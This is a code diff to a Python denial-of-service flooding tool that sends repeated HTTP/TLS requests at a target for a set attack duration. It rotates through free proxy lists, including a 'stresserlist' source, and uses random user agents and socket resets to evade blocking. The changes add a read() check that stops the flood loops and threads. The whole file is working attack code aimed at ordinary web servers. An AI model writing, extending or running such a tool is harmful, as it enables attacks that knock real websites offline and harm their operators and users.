@@ -1,5 +1,5 @@
 import socks, socket, requests, ssl, random, struct, threading, os, re
-from MODEL.data import get_target, generate_url_path, random_useragent, same_random, get_command, header_random
+from MODEL.data import get_target, generate_url_path, random_useragent, same_random, get_command, header_random,read
 
 def PaKT(meth, pth, target, ssl_socket, mode):
     if mode['END'] == '2':
@@ -60,6 +60,7 @@ def PROXY_GET(mode, type, rand, times, methods, target,mode3):
         if r.status_code != 429:
          r = r.content.decode()
          for proxy in r.split('\n'):
+          if read() == True:break
           ip = proxy.split(':')
           s = socks.socksocket()
           SET(s,type,ip)
@@ -70,8 +71,10 @@ def browser_send(ssl_socket,byt,mode):
    try:
     ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
     for _ in range(500):
+     if read() == True:break
      if mode['SENDER'] == '1': 
       for by in byt:
+       if read() == True:break
        ssl_socket.write(by); ssl_socket.sendall(by); ssl_socket.send(by)
        if mode['RESET'] == '1':
         ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
@@ -87,6 +90,7 @@ def browser_send(ssl_socket,byt,mode):
 def browser(target, methods, duration_sec_attack_dude, type,ip2,proxy_mode,mode3):
     path = 1
     for _ in range(int(duration_sec_attack_dude)):
+        if read() == True:break
         try:
             for _ in range(500):
                 if proxy_mode == 'None':
@@ -132,6 +136,11 @@ target = get_target(target_url)
 if p != 0:
  links = ['https://www.proxy-list.download/api/v1/get?type=%s','https://raw.githubusercontent.com/casals-ar/proxy-list/main/%s','https://raw.githubusercontent.com/zloi-user/hideip.me/main/%s.txt','https://raw.githubusercontent.com/prxchk/proxy-list/main/%s.txt','https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/%s.txt','https://www.stresserlist.com/scripts/%s.txt','http://pubproxy.com/api/proxy?type=%s&referer=true&user_agent=true&cookies=true&format=txt&limit=5&https=true','http://pubproxy.com/api/proxy?type=%s&referer=true&user_agent=true&cookies=true&format=txt&limit=5','https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/%s.txt','https://proxyspace.pro/%s.txt','https://api.proxyscrape.com/?request=displayproxies&proxytype=%s&country=all','https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/%s.txt']
  for _ in range(thread):
-   for a in links:threading.Thread(target=PROXY_GET,args=(mode, p, a, times, meth, target, mode2)).start()
+   if read() == True:break
+   for a in links:
+       if read() == True:break
+       threading.Thread(target=PROXY_GET,args=(mode, p, a, times, meth, target, mode2)).start()
 else:
-   for _ in range(thread):threading.Thread(target=browser,args=(target, meth, times, p, '1.1.1.1', 'None', mode2)).start()
+   for _ in range(thread):
+       if read() == True:break
+       threading.Thread(target=browser,args=(target, meth, times, p, '1.1.1.1', 'None', mode2)).start()
